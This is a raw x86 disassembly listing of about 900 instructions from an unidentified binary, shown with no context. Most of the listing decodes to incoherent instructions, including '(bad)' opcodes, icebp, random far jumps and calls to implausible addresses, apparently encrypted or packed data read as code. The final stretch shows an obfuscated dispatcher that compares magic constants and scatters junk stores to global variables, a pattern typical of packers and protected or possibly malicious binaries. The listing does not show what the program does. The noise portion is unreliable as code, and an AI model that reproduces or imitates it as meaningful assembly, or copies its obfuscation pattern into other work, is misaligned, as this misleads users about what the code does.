  41da00:	mov    DWORD PTR [eax+ecx*8-0x2a],edi
  41da04:	cmc    
  41da05:	adc    BYTE PTR [eax-0x4],cl
  41da08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da09:	cmc    
  41da0a:	mov    ds:0xb920c2fd,al
  41da0f:	sbb    bl,BYTE PTR [ebp+0x6]
  41da12:	call   0x18cba854
  41da17:	xor    BYTE PTR [ebx+0x22],bl
  41da1a:	mov    eax,0xf72bf66c
  41da1f:	push   0x2f
  41da21:	aas    
  41da22:	push   0x5e
  41da24:	retf   
  41da25:	cmp    ch,BYTE PTR [edx+0x4f7db453]
  41da2b:	inc    eax
  41da2c:	lock pop edx
  41da2e:	cmp    ah,bh
  41da30:	mov    ebx,0xe351dc1
  41da35:	fwait
  41da36:	dec    esi
  41da37:	fs icebp 
  41da39:	inc    ebx
  41da3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da3b:	push   0xffffffe0
  41da3d:	inc    eax
  41da3e:	jno    0x41da23
  41da40:	fs and eax,0xd9c50c2d
  41da46:	fiadd  DWORD PTR [ecx-0x42]
  41da49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da4a:	test   cl,bh
  41da4c:	std    
  41da4d:	adc    DWORD PTR [edi+ebx*4+0x26],0xffffffe1
  41da52:	shr    BYTE PTR [edx],cl
  41da54:	dec    edi
  41da55:	das    
  41da56:	test   DWORD PTR [ecx+ebp*1+0x7797d67a],esp
  41da5d:	push   esp
  41da5e:	in     eax,dx
  41da5f:	shl    DWORD PTR [ebp-0x68],cl
  41da62:	aas    
  41da63:	ror    edx,0x6f
  41da66:	shl    BYTE PTR [edi],0x23
  41da69:	xor    esp,DWORD PTR [ecx+eax*1+0x13]
  41da6d:	sub    esi,DWORD PTR [edi]
  41da6f:	test   al,0xc0
  41da71:	dec    esp
  41da72:	sbb    eax,0x9de3b2c9
  41da77:	sbb    DWORD PTR [esi],edx
  41da79:	cmp    eax,0x55efd6d4
  41da7e:	push   0xffffff82
  41da80:	pusha  
  41da81:	cs adc al,0x5a
  41da84:	shl    DWORD PTR [edx+0x77c5fbfc],cl
  41da8a:	test   BYTE PTR [edi-0x452e17ff],ch
  41da90:	into   
  41da91:	std    
  41da92:	jne    0x41da98
  41da94:	into   
  41da95:	inc    esi
  41da96:	cmp    edx,ebp
  41da98:	add    al,0x90
  41da9a:	sub    dl,dl
  41da9c:	and    ah,bl
  41da9e:	sbb    esp,DWORD PTR fs:[ebp+0x57]
  41daa2:	dec    edi
  41daa3:	pop    ebp
  41daa4:	fisub  WORD PTR [edi]
  41daa6:	lock mov eax,ds:0xac90c879
  41daac:	sub    edx,0xffffffcd
  41daaf:	loop   0x41da77
  41dab1:	inc    esp
  41dab2:	es pop eax
  41dab4:	add    BYTE PTR [esi],dh
  41dab6:	fs push ds
  41dab8:	outs   dx,DWORD PTR ds:[esi]
  41dab9:	sbb    DWORD PTR [ebp+0x5d14a7af],edi
  41dabf:	stos   BYTE PTR es:[edi],al
  41dac0:	cmp    ch,ch
  41dac2:	pop    edx
  41dac3:	sti    
  41dac4:	sbb    DWORD PTR [ebp+0x13e1095b],edi
  41daca:	ss das 
  41dacc:	int    0x64
  41dace:	scas   al,BYTE PTR es:[edi]
  41dacf:	(bad)  
  41dad0:	test   DWORD PTR [ecx+0x2a92ae5e],0xd61984e4
  41dada:	inc    ebx
  41dadb:	xchg   BYTE PTR [edi],dl
  41dadd:	jle    0x41da77
  41dadf:	inc    edx
  41dae0:	outs   dx,BYTE PTR ds:[esi]
  41dae1:	loope  0x41daee
  41dae3:	jne    0x41db1c
  41dae5:	push   eax
  41dae6:	fnstenv fs:[eax+0x5]
  41daea:	retf   
  41daeb:	adc    ch,bl
  41daed:	xor    DWORD PTR [edx],0xffffff8c
  41daf0:	ret    
  41daf1:	dec    ecx
  41daf2:	or     DWORD PTR [esi],ecx
  41daf4:	retf   
  41daf5:	lds    esp,FWORD PTR [edi+0x6687a83b]
  41dafb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafc:	push   ds
  41dafd:	xchg   ecx,eax
  41dafe:	jg     0x41db32
  41db00:	pop    esi
  41db01:	sub    ebp,DWORD PTR [eax]
  41db03:	ins    BYTE PTR es:[edi],dx
  41db04:	imul   esp,DWORD PTR [edi-0x29a7b948],0x59
  41db0b:	cs lahf 
  41db0d:	push   cs
  41db0e:	nop
  41db0f:	arpl   WORD PTR [edx+0x7cbbfce4],dx
  41db15:	jnp    0x41daa9
  41db17:	inc    ebp
  41db18:	jae    0x41db27
  41db1a:	add    eax,0xb11e80a
  41db1f:	sbb    eax,edi
  41db21:	lods   eax,DWORD PTR ds:[esi]
  41db22:	inc    esp
  41db23:	popf   
  41db24:	inc    esp
  41db25:	shl    BYTE PTR [ebx-0x5107dde1],cl
  41db2b:	arpl   WORD PTR [edi],si
  41db2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db2e:	in     eax,0xe6
  41db30:	mov    al,0xf4
  41db32:	ficomp WORD PTR [ecx+0x2d]
  41db35:	clc    
  41db36:	dec    ebp
  41db37:	nop
  41db38:	lods   al,BYTE PTR ds:[esi]
  41db39:	sub    bl,BYTE PTR [eax-0x77a1bd0a]
  41db3f:	push   edx
  41db40:	ret    
  41db41:	xlat   BYTE PTR ds:[ebx]
  41db42:	adc    dl,BYTE PTR [ebp+0x3012d4f9]
  41db48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db49:	dec    edx
  41db4a:	iret   
  41db4b:	nop
  41db4c:	arpl   bp,bx
  41db4e:	fsubr  DWORD PTR ds:0x3c9e1c6e
  41db54:	outs   dx,DWORD PTR ds:[esi]
  41db55:	pop    ebx
  41db56:	rcl    BYTE PTR [ebp-0x29],1
  41db59:	gs jle 0x41db35
  41db5c:	das    
  41db5d:	xor    dl,BYTE PTR [eax-0x406a6d95]
  41db63:	popa   
  41db64:	(bad)  
  41db66:	retf   
  41db67:	mov    al,0xe0
  41db69:	das    
  41db6a:	mov    ah,0x55
  41db6c:	mov    eax,ds:0x3a7a5f9c
  41db71:	dec    edx
  41db72:	fadd   DWORD PTR [ecx-0x72c4a9a3]
  41db78:	hlt    
  41db79:	and    esi,DWORD PTR ds:0x6bcc0fd9
  41db7f:	jae    0x41db41
  41db81:	setns  BYTE PTR [ebx+0x2316b281]
  41db88:	dec    esp
  41db89:	clc    
  41db8a:	sub    eax,0x20531c93
  41db8f:	daa    
  41db90:	add    ebp,DWORD PTR [ebp+0x7b]
  41db93:	(bad)  
  41db94:	call   0xa034f5bc
  41db99:	mov    al,ds:0x114c1bd6
  41db9e:	mov    al,ds:0x14f055ad
  41dba3:	or     cl,BYTE PTR [ebp+0x3e]
  41dba6:	(bad)  
  41dba7:	xor    BYTE PTR [ecx],0xf4
  41dbaa:	lock sbb al,0xe0
  41dbad:	xchg   esi,eax
  41dbae:	(bad)  
  41dbaf:	icebp  
  41dbb0:	in     al,dx
  41dbb1:	in     eax,dx
  41dbb2:	repz repz fcom DWORD PTR [edi]
  41dbb6:	mov    dl,ch
  41dbb8:	pop    ds
  41dbb9:	mov    bl,0xc5
  41dbbb:	push   edx
  41dbbc:	add    bl,BYTE PTR [ebp+0xf]
  41dbbf:	popf   
  41dbc0:	fdiv   QWORD PTR [esi+0x3]
  41dbc3:	leave  
  41dbc4:	cdq    
  41dbc5:	(bad)  
  41dbc6:	mov    bh,BYTE PTR [eax+0x3a6a9b6]
  41dbcc:	pushf  
  41dbcd:	mov    dl,BYTE PTR [eax+0x13]
  41dbd0:	imul   edi,DWORD PTR [eax],0x2a6871da
  41dbd6:	dec    eax
  41dbd7:	pop    ss
  41dbd8:	ficomp WORD PTR [edx-0x1e0ac6e0]
  41dbde:	neg    BYTE PTR [ebx+0x5d]
  41dbe1:	hlt    
  41dbe2:	dec    edx
  41dbe3:	mov    esi,0x627ca643
  41dbe9:	or     DWORD PTR [esi+0x4dfc3269],0x3b77fc98
  41dbf3:	xor    eax,0x1557fdc
  41dbf8:	scas   eax,DWORD PTR es:[edi]
  41dbf9:	scas   eax,DWORD PTR es:[edi]
  41dbfa:	(bad)  
  41dbfb:	sahf   
  41dbfc:	push   esp
  41dbfd:	xchg   ebp,eax
  41dbfe:	call   0x57df4c2e
  41dc03:	xchg   esi,eax
  41dc04:	sbb    al,0x90
  41dc06:	lahf   
  41dc07:	jg     0x41dc5f
  41dc09:	loope  0x41dbbf
  41dc0b:	shr    BYTE PTR [ebx-0x69bf1039],0xd0
  41dc12:	aas    
  41dc13:	retf   
  41dc14:	loop   0x41dbc2
  41dc16:	and    al,bh
  41dc18:	je     0x41dbac
  41dc1a:	in     eax,0xe7
  41dc1c:	dec    BYTE PTR [edx+eiz*4+0x22]
  41dc20:	mov    ds:0x4e85cadb,eax
  41dc25:	cmp    DWORD PTR [ecx+eax*8-0x678d76fa],eax
  41dc2c:	dec    edx
  41dc2d:	inc    ebp
  41dc2e:	cwde   
  41dc2f:	inc    esi
  41dc30:	(bad)  
  41dc31:	cmp    al,bh
  41dc33:	repz test eax,0xea61697b
  41dc39:	fs adc eax,0x4009880d
  41dc3f:	out    dx,eax
  41dc40:	nop
  41dc41:	jmp    0x41dc00
  41dc43:	stos   BYTE PTR es:[edi],al
  41dc44:	in     eax,dx
  41dc45:	mov    eax,0x87882494
  41dc4a:	or     ah,BYTE PTR [ebx+0x2eaa258d]
  41dc50:	push   ds
  41dc51:	lds    ecx,FWORD PTR [ecx+0x50]
  41dc54:	mov    edx,DWORD PTR [ecx+0x6d]
  41dc57:	out    dx,eax
  41dc58:	jo     0x41dcb5
  41dc5a:	inc    esi
  41dc5b:	mov    BYTE PTR [edx],cl
  41dc5d:	test   eax,0x8fc3bb91
  41dc62:	jle    0x41dbf8
  41dc64:	pop    esi
  41dc65:	dec    esi
  41dc66:	xchg   ebx,eax
  41dc67:	add    al,BYTE PTR [edx+0x6d]
  41dc6a:	mov    esp,0xa6d5dd7
  41dc6f:	jno    0x41dce8
  41dc71:	dec    edi
  41dc72:	int3   
  41dc73:	mov    eax,0xef9e4598
  41dc78:	jne    0x41dc43
  41dc7a:	add    eax,edi
  41dc7c:	arpl   cx,bp
  41dc7e:	in     al,dx
  41dc7f:	jmp    0x1780bbb
  41dc84:	pop    edx
  41dc85:	push   cs
  41dc86:	or     BYTE PTR [eax],dh
  41dc88:	fisub  DWORD PTR [esi+0x13]
  41dc8b:	sar    DWORD PTR [eax+0x65283440],1
  41dc91:	mov    edi,0xb06ac075
  41dc96:	mov    cl,0xaf
  41dc98:	inc    ebp
  41dc99:	mov    edx,0x9a59863a
  41dc9e:	cmp    eax,0xc963372b
  41dca3:	jl     0x41dc78
  41dca5:	loope  0x41dcac
  41dca7:	cmc    
  41dca8:	les    edx,FWORD PTR [edi+eiz*2-0x22e616cc]
  41dcaf:	cmc    
  41dcb0:	adc    al,0xcb
  41dcb2:	loope  0x41dd2b
  41dcb4:	fwait
  41dcb5:	sub    edx,DWORD PTR [ebp+0x4c]
  41dcb8:	xor    eax,0x169c4b21
  41dcbd:	and    DWORD PTR [esi+0x5772b8de],ecx
  41dcc3:	ds je  0x41dcd3
  41dcc6:	add    DWORD PTR [edi],0x45
  41dcc9:	inc    edi
  41dcca:	dec    ebx
  41dccb:	jmp    0x7d011601
  41dcd0:	pop    edi
  41dcd1:	repnz mov esp,0xb5e1247e
  41dcd7:	and    eax,0x1c5df78d
  41dcdc:	mov    ecx,eax
  41dcde:	sbb    bl,BYTE PTR [eax]
  41dce0:	xor    eax,DWORD PTR [ebx-0x45]
  41dce3:	cli    
  41dce4:	dec    esp
  41dce5:	out    0xd4,al
  41dce7:	sbb    BYTE PTR ds:0xe27d8fd8,bl
  41dced:	enter  0x3ae9,0x21
  41dcf1:	or     ecx,DWORD PTR [edx+ecx*2]
  41dcf4:	ret    0x7b7
  41dcf7:	fnstsw WORD PTR [ecx-0x5c]
  41dcfa:	popa   
  41dcfb:	jns    0x41dca4
  41dcfd:	xchg   ebp,eax
  41dcfe:	ret    
  41dcff:	shl    DWORD PTR [ecx],0x66
  41dd02:	push   ebx
  41dd03:	(bad)  
  41dd04:	in     eax,dx
  41dd05:	test   DWORD PTR [esi+0x16],0x9f4f3a1b
  41dd0c:	xchg   esp,eax
  41dd0d:	(bad)  
  41dd0e:	pop    ebx
  41dd0f:	leave  
  41dd10:	bound  esi,QWORD PTR [edx-0x54]
  41dd13:	(bad)  
  41dd14:	sbb    cl,BYTE PTR es:[ebp-0x35]
  41dd18:	dec    edx
  41dd19:	fisttp WORD PTR [edx+0x11]
  41dd1c:	push   eax
  41dd1d:	sub    eax,0xb8964e1a
  41dd22:	iret   
  41dd23:	xchg   cl,cl
  41dd25:	inc    ecx
  41dd27:	mov    dl,0x6d
  41dd29:	mov    eax,0xca214a90
  41dd2e:	cmp    BYTE PTR [ebx-0x1],al
  41dd31:	sub    DWORD PTR [edi+edx*4+0x2d2d3103],esp
  41dd38:	arpl   WORD PTR [ecx],si
  41dd3a:	add    esi,ebp
  41dd3c:	mov    ah,0x16
  41dd3e:	imul   ebp,DWORD PTR [ebx],0x81627d41
  41dd44:	sahf   
  41dd45:	mov    ch,0x4e
  41dd47:	and    al,BYTE PTR [edi+ebx*1-0x30]
  41dd4b:	into   
  41dd4c:	ins    BYTE PTR es:[edi],dx
  41dd4d:	scas   al,BYTE PTR es:[edi]
  41dd4e:	loopne 0x41dcea
  41dd50:	push   esi
  41dd51:	popa   
  41dd52:	cmp    eax,0xd0938b5f
  41dd57:	pusha  
  41dd58:	jp     0x41dda6
  41dd5a:	or     DWORD PTR [ecx],ecx
  41dd5c:	lods   al,BYTE PTR ds:[esi]
  41dd5d:	iret   
  41dd5e:	mov    ds:0x652d7c5c,al
  41dd63:	xor    eax,0xd0e20d4
  41dd68:	mov    ebx,0xd0e5bc8a
  41dd6d:	jno    0x41dd9f
  41dd6f:	add    DWORD PTR [edx],0xc8ab6f1f
  41dd75:	adc    dl,BYTE PTR [eax-0x4d]
  41dd78:	ret    
  41dd79:	xchg   BYTE PTR [esi+0x4a],bh
  41dd7c:	mov    ebp,DWORD PTR [ebx+0x22]
  41dd7f:	inc    esi
  41dd80:	test   eax,0x942934a4
  41dd85:	push   edi
  41dd86:	xor    eax,0xadb4e60
  41dd8b:	xchg   DWORD PTR [ecx-0x7],edx
  41dd8e:	inc    edi
  41dd8f:	push   ecx
  41dd90:	sbb    eax,0x7c93f992
  41dd95:	ss xchg esp,eax
  41dd97:	mov    esi,0x8b11835
  41dd9c:	rcl    eax,0x93
  41dd9f:	sub    eax,0xfc2c531
  41dda4:	jno    0x41dd7e
  41dda6:	xchg   ebx,eax
  41dda7:	sub    cl,cl
  41dda9:	cdq    
  41ddaa:	scas   al,BYTE PTR es:[edi]
  41ddab:	push   ds
  41ddac:	bnd ret 0x254c
  41ddb0:	test   eax,0xff5c387f
  41ddb5:	sub    DWORD PTR [edx-0x23],ebx
  41ddb8:	mov    esp,0xf8e73a67
  41ddbe:	xor    al,0xfd
  41ddc0:	sar    BYTE PTR [ebx-0x54],cl
  41ddc3:	sti    
  41ddc4:	jnp    0x41ddfc
  41ddc6:	ja     0x41dda1
  41ddc8:	jbe    0x41dd8d
  41ddca:	xchg   edx,eax
  41ddcb:	jo     0x41de3c
  41ddcd:	imul   ebp,DWORD PTR [ebx+eiz*8],0xe61927a4
  41ddd4:	add    dl,bl
  41ddd6:	or     BYTE PTR [eax-0x5347551b],cl
  41dddc:	mov    dh,0x13
  41ddde:	std    
  41dddf:	lahf   
  41dde0:	repnz adc al,bh
  41dde3:	or     ebp,eax
  41dde5:	sti    
  41dde6:	cmp    al,0xca
  41dde8:	sbb    dl,BYTE PTR [edi+edx*2+0x7a6a4577]
  41ddef:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41ddf1:	dec    ebx
  41ddf2:	stos   DWORD PTR es:[edi],eax
  41ddf3:	pop    ss
  41ddf4:	pop    ecx
  41ddf5:	aas    
  41ddf6:	mov    ds:0x93c4940f,eax
  41ddfb:	cli    
  41ddfc:	mov    bh,0x95
  41ddfe:	loope  0x41de00
  41de00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de01:	mov    bl,0xa9
  41de03:	xchg   edx,eax
  41de04:	fidivr WORD PTR [edi+0x5aef957e]
  41de0a:	jmp    0x956c88ee
  41de0f:	adc    esi,DWORD PTR [ebx-0x46]
  41de12:	adc    eax,0xf27d98cd
  41de17:	dec    ebx
  41de18:	push   ss
  41de19:	jl     0x41ddd9
  41de1b:	test   eax,0xe635810b
  41de20:	test   eax,0x11504e16
  41de25:	inc    DWORD PTR [ecx]
  41de27:	mov    ecx,0x1672053d
  41de2c:	push   esp
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	dec    edi
  41de2f:	mov    ?,WORD PTR [esi+0x74]
  41de32:	(bad)  
  41de33:	repnz mov al,ds:0xd64651cd
  41de39:	cwde   
  41de3a:	xchg   ebp,eax
  41de3b:	shl    BYTE PTR [eax+0xf129a0a],cl
  41de41:	mov    edx,0xbc20b9c9
  41de46:	icebp  
  41de47:	xchg   esi,eax
  41de48:	jne    0x41de51
  41de4a:	pop    ecx
  41de4b:	leave  
  41de4c:	out    dx,eax
  41de4d:	inc    bx
  41de4f:	rcr    eax,cl
  41de51:	push   es
  41de52:	das    
  41de53:	shr    BYTE PTR [edx],1
  41de55:	outs   dx,DWORD PTR ds:[esi]
  41de56:	mov    ch,dh
  41de58:	push   ebx
  41de59:	(bad)  
  41de5a:	out    0x6d,al
  41de5c:	popa   
  41de5d:	mov    ds:0xbbc34fb0,al
  41de62:	and    eax,0x5d3b0a5b
  41de67:	inc    BYTE PTR ds:0xcc0b6622
  41de6d:	popa   
  41de6e:	je     0x41de7f
  41de70:	repnz fisttp QWORD PTR [esi-0x40]
  41de74:	jbe    0x41ddf7
  41de76:	add    dl,BYTE PTR ds:0x909cbf15
  41de7c:	or     al,BYTE PTR ds:0x964b9cdb
  41de82:	xor    eax,0x38efc752
  41de87:	neg    DWORD PTR [ebx-0x51]
  41de8a:	aam    0xe8
  41de8c:	mov    ecx,0x9517649f
  41de91:	retf   0xcea3
  41de94:	cmp    al,0x1f
  41de96:	push   0xc4fed2a4
  41de9b:	sbb    ebx,DWORD PTR [esi]
  41de9d:	stos   DWORD PTR es:[edi],eax
  41de9e:	add    bh,BYTE PTR [esi-0x5a]
  41dea1:	mov    edi,0x956e08b1
  41dea6:	idiv   DWORD PTR [ecx+ebp*4]
  41dea9:	das    
  41deaa:	mov    ah,cl
  41deac:	xchg   edi,eax
  41dead:	scas   eax,DWORD PTR es:[edi]
  41deae:	lds    eax,FWORD PTR [eax+0x21]
  41deb1:	shl    DWORD PTR [eax+ebx*8+0x1967079c],0xdc
  41deb9:	jle    0x41dec7
  41debb:	jg     0x41df19
  41debd:	enter  0x6443,0x95
  41dec1:	mov    ecx,0x3167885a
  41dec6:	xlat   BYTE PTR ds:[ebx]
  41dec7:	mov    edx,0xce41c70e
  41decc:	dec    ebp
  41decd:	bound  ebp,QWORD PTR [ebx-0x78]
  41ded0:	mov    ebp,0xe861fe71
  41ded5:	aas    
  41ded6:	lea    eax,[esi+0x147e49aa]
  41dedc:	dec    ebp
  41dedd:	mov    edx,0xc6614ccb
  41dee2:	ror    DWORD PTR [ecx],0xe6
  41dee5:	gs mov esp,0xd8ae2833
  41deeb:	(bad)
  41deee:	sub    esp,DWORD PTR fs:[edi]
  41def1:	iret   
  41def2:	jno    0x41de9d
  41def4:	ins    DWORD PTR es:[edi],dx
  41def5:	jg     0x41dee4
  41def7:	ror    BYTE PTR [ebp-0x2e5ca790],1
  41defd:	aaa    
  41defe:	mov    eax,DWORD PTR [edi+0x65]
  41df01:	daa    
  41df02:	into   
  41df03:	adc    cl,0xdf
  41df06:	adc    al,0x86
  41df08:	jecxz  0x41deae
  41df0a:	ffree  st(1)
  41df0c:	add    eax,0xcdfa9e7b
  41df11:	loop   0x41de95
  41df13:	pop    eax
  41df14:	scas   al,BYTE PTR es:[edi]
  41df15:	pop    esi
  41df16:	leave  
  41df17:	adc    dl,bl
  41df19:	mov    al,ds:0x2c719394
  41df1e:	pusha  
  41df1f:	scas   eax,DWORD PTR es:[edi]
  41df20:	sub    BYTE PTR gs:[ebp+0x5a8704ba],cl
  41df27:	aaa    
  41df28:	mov    ecx,DWORD PTR [edi-0x7e74f6c7]
  41df2e:	test   al,0x54
  41df30:	push   ss
  41df31:	jns    0x41df5b
  41df33:	ds cdq 
  41df35:	jns    0x41dedb
  41df37:	push   eax
  41df38:	jne    0x41df5d
  41df3a:	and    ah,BYTE PTR [edx]
  41df3c:	fcom   DWORD PTR [esi-0x2d]
  41df3f:	inc    esp
  41df40:	xchg   ebp,eax
  41df41:	push   ds
  41df42:	popf   
  41df43:	lahf   
  41df44:	add    BYTE PTR [edx-0x18],ah
  41df47:	jmp    0x41dfa4
  41df49:	jl     0x41df54
  41df4b:	and    eax,0x85106e84
  41df50:	and    bl,BYTE PTR [esi]
  41df52:	retf   
  41df53:	cli    
  41df54:	or     cl,bh
  41df56:	jmp    0xc29f:0x471690a6
  41df5d:	xlat   BYTE PTR ds:[ebx]
  41df5e:	adc    BYTE PTR [edi-0x1a8a3bbb],al
  41df64:	mov    ebp,0x3de35d4a
  41df69:	mov    DWORD PTR [ecx-0x1],ebx
  41df6c:	into   
  41df6d:	pop    ebx
  41df6e:	sub    edx,DWORD PTR [edx+0x6f]
  41df71:	adc    eax,0x18b352ee
  41df76:	in     al,0x47
  41df78:	and    DWORD PTR [edi+0x63],eax
  41df7b:	adc    ebx,ebx
  41df7d:	cmp    dl,BYTE PTR [eax+esi*1-0x48]
  41df81:	enter  0xa647,0x3
  41df85:	cmp    DWORD PTR [edx+0x10],ecx
  41df88:	mov    ah,0xec
  41df8a:	push   0xffffff82
  41df8c:	scas   eax,DWORD PTR es:[edi]
  41df8d:	popa   
  41df8e:	lods   al,BYTE PTR ds:[esi]
  41df8f:	arpl   WORD PTR [edi-0xc],bp
  41df92:	sbb    eax,0xfc78be12
  41df97:	rol    cl,cl
  41df99:	xchg   esi,eax
  41df9a:	pushf  
  41df9b:	dec    eax
  41df9c:	lahf   
  41df9d:	in     eax,dx
  41df9e:	jb     0x41dfa6
  41dfa0:	and    DWORD PTR [ebp-0xdf9942b],0x28e59bfe
  41dfaa:	shr    ebp,cl
  41dfac:	xchg   ebx,eax
  41dfad:	push   ecx
  41dfae:	dec    ebx
  41dfaf:	sub    ebx,DWORD PTR ss:[edi-0x4d]
  41dfb3:	jb     0x41dffd
  41dfb5:	mov    ecx,DWORD PTR [edx-0xf4953a2]
  41dfbb:	lahf   
  41dfbc:	and    BYTE PTR [ecx+0x63],0x99
  41dfc0:	mulps  xmm4,XMMWORD PTR [ecx]
  41dfc3:	xchg   ecx,eax
  41dfc4:	std    
  41dfc5:	mov    DWORD PTR [edx-0x30],esi
  41dfc8:	out    0x90,al
  41dfca:	cmp    DWORD PTR [eax-0x4e],ecx
  41dfcd:	fadd   QWORD PTR [ecx]
  41dfcf:	mov    ecx,0x7ce7eae7
  41dfd4:	mov    bl,0xa4
  41dfd6:	xchg   ebx,eax
  41dfd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfd8:	mov    bh,0x47
  41dfda:	mov    ebp,DWORD PTR [ebx-0x7cc087b0]
  41dfe0:	dec    esp
  41dfe1:	adc    bh,ch
  41dfe3:	mov    esi,0x6eacc64a
  41dfe8:	popa   
  41dfe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfea:	in     eax,dx
  41dfeb:	mov    DWORD PTR [edi+0x1d],esp
  41dfee:	pusha  
  41dfef:	std    
  41dff0:	and    eax,0x9d66bac8
  41dff5:	iret   
  41dff6:	jbe    0x41e031
  41dff8:	sub    eax,0x9e6a1769
  41dffd:	cmp    al,0x22
  41dfff:	in     al,dx
  41e000:	les    esp,FWORD PTR [edi-0x20]
  41e003:	adc    eax,0xf0821855
  41e008:	jge    0x41e015
  41e00a:	mov    eax,ds:0xfe882bd0
  41e00f:	sub    DWORD PTR [ebp+edi*2-0x36],ebx
  41e013:	xchg   edx,eax
  41e014:	or     al,0x49
  41e016:	cmp    bh,BYTE PTR [eax]
  41e018:	fimul  DWORD PTR [edx]
  41e01a:	int3   
  41e01b:	fnstenv [esi-0x51]
  41e01e:	jecxz  0x41dfc5
  41e020:	or     DWORD PTR [edx],eax
  41e022:	or     ch,BYTE PTR [ecx]
  41e024:	shl    BYTE PTR ds:0xe8656f42,0x39
  41e02b:	test   bh,dl
  41e02d:	mov    BYTE PTR [edx],bl
  41e02f:	jle    0x41dfcf
  41e031:	mov    ebx,DWORD PTR [ecx]
  41e033:	out    dx,eax
  41e034:	mov    dh,0x6e
  41e036:	clc    
  41e037:	(bad)  
  41e038:	(bad)
  41e03c:	fwait
  41e03d:	xchg   esp,ebx
  41e03f:	lods   eax,DWORD PTR ds:[esi]
  41e040:	xchg   DWORD PTR [eax-0x6abe6d96],ebx
  41e046:	jp     0x41e05b
  41e048:	jle    0x41e055
  41e04a:	push   ebp
  41e04b:	xor    ch,cl
  41e04d:	out    dx,al
  41e04e:	jl     0x41e004
  41e050:	jns    0x41dff1
  41e052:	pop    ss
  41e053:	addr16 icebp 
  41e055:	mov    ch,0x16
  41e057:	shr    DWORD PTR [edi+0x3e],0x85
  41e05b:	enter  0x910f,0x21
  41e05f:	stos   DWORD PTR es:[edi],eax
  41e060:	cli    
  41e061:	das    
  41e062:	adc    DWORD PTR [edi],edx
  41e064:	push   eax
  41e065:	mov    ch,0xb2
  41e067:	pusha  
  41e068:	nop
  41e069:	push   cs
  41e06a:	and    dl,ch
  41e06c:	das    
  41e06d:	push   0xdb2be86a
  41e072:	imul   esi,ebp,0x5af5ba8e
  41e078:	iret   
  41e079:	popf   
  41e07a:	dec    edx
  41e07b:	inc    edx
  41e07c:	sahf   
  41e07d:	jp     0x41e061
  41e07f:	data16 mov ?,WORD PTR [edi+0x4a]
  41e083:	(bad)  
  41e084:	scas   al,BYTE PTR es:[edi]
  41e085:	in     eax,dx
  41e086:	int3   
  41e087:	add    BYTE PTR cs:[edx+0x736ce644],ah
  41e08e:	inc    eax
  41e08f:	adc    eax,0xa80e5781
  41e094:	add    BYTE PTR [ecx+0x13f4e07],cl
  41e09a:	inc    edx
  41e09b:	jge    0x41e0f7
  41e09d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41e09f:	mov    cl,0xfa
  41e0a1:	mov    esi,0x7e03b9d8
  41e0a6:	outs   dx,BYTE PTR ds:[esi]
  41e0a7:	dec    edi
  41e0a8:	loopne 0x41e0af
  41e0aa:	pop    ebp
  41e0ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0ac:	xchg   edi,eax
  41e0ad:	mov    ecx,0x76f40a92
  41e0b2:	into   
  41e0b3:	mov    dh,0xda
  41e0b5:	mov    cl,BYTE PTR [eax+0x77]
  41e0b8:	adc    al,0xa4
  41e0ba:	cmp    eax,0x70941f91
  41e0bf:	mov    DWORD PTR ds:0x428e3f,0x1354
  41e0c9:	jne    0x41e100
  41e0cf:	cmp    esi,ebx
  41e0d1:	mov    DWORD PTR ds:0x428e7b,0x261b
  41e0db:	jne    0x41e100
  41e0e1:	push   ebx
  41e0e2:	mov    DWORD PTR ds:0x428e67,0x2b68
  41e0ec:	push   0x70941f97
  41e0f1:	mov    DWORD PTR ds:0x428e63,0x40d9
  41e0fb:	jmp    0x420786
  41e100:	mov    eax,ds:0x428eb7
  41e105:	mov    eax,DWORD PTR [ebp+0x18]
  41e108:	mov    esi,DWORD PTR [ebp+0x1c]
  41e10b:	cmp    eax,0x70941f97
  41e110:	mov    DWORD PTR ds:0x428ebb,0x3db6
  41e11a:	jne    0x41e147
  41e120:	cmp    esi,ebx
  41e122:	mov    DWORD PTR ds:0x428e5f,0x2bd8
  41e12c:	jne    0x41e147
  41e132:	push   ebx
  41e133:	mov    DWORD PTR ds:0x428e2b,0x15b3
  41e13d:	push   0x70941f95
  41e142:	jmp    0x420786
  41e147:	mov    DWORD PTR ds:0x428e73,0x7017
  41e151:	mov    eax,DWORD PTR [ebp+0x18]
  41e154:	mov    esi,DWORD PTR [ebp+0x1c]
  41e157:	mov    DWORD PTR ds:0x428e27,0x78f9
  41e161:	cmp    eax,0x70941f95
  41e166:	jne    0x41e19d
  41e16c:	mov    DWORD PTR ds:0x428ecf,0x6494
  41e176:	cmp    esi,ebx
  41e178:	jne    0x41e19d
  41e17e:	push   ebx
  41e17f:	mov    DWORD PTR ds:0x428ea3,0x58e0
  41e189:	push   0x70941f9b
  41e18e:	mov    DWORD PTR ds:0x428e3f,0x40d6
  41e198:	jmp    0x420786
  41e19d:	mov    DWORD PTR ds:0x428e93,edx
  41e1a3:	mov    eax,DWORD PTR [ebp+0x18]
  41e1a6:	mov    esi,DWORD PTR [ebp+0x1c]
  41e1a9:	mov    DWORD PTR ds:0x428e83,0x6338
  41e1b3:	cmp    eax,0x70941f9b
  41e1b8:	mov    DWORD PTR ds:0x428e53,0x174c
  41e1c2:	jne    0x41e203
  41e1c8:	mov    DWORD PTR ds:0x428e67,0x61b3
  41e1d2:	cmp    esi,ebx
  41e1d4:	mov    DWORD PTR ds:0x428e4b,0x6bb8
  41e1de:	jne    0x41e203
  41e1e4:	mov    DWORD PTR ds:0x428e2b,0x777c
  41e1ee:	push   ebx
  41e1ef:	push   0x70941f99
  41e1f4:	mov    DWORD PTR ds:0x428eb7,0x6b5e
  41e1fe:	jmp    0x420786
  41e203:	mov    eax,DWORD PTR [ebp+0x18]
  41e206:	not    edi
